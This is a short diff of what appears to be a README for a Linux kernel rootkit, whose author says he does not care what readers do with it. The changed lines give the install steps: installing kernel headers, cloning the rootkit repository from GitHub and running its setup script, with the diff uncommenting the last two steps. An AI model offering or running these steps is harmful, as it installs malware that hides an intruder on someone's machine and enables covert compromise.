@@ -25,11 +25,11 @@ I really don't give two shits what you do with this rootkit it's pretty shit lol
    
 
 
-#Install 
-`apt-get install linux-headers-$(uname -r)
-git clone https://github.com/ret2win/siph0n-rootkit.git
-#cd siph0n-rootkit
-#./setup.sh install `
+ #Install 
+ `apt-get install linux-headers-$(uname -r)
+ git clone https://github.com/ret2win/siph0n-rootkit.git
+ cd siph0n-rootkit
+ ./setup.sh install `
 
 
 - Uninstall: 
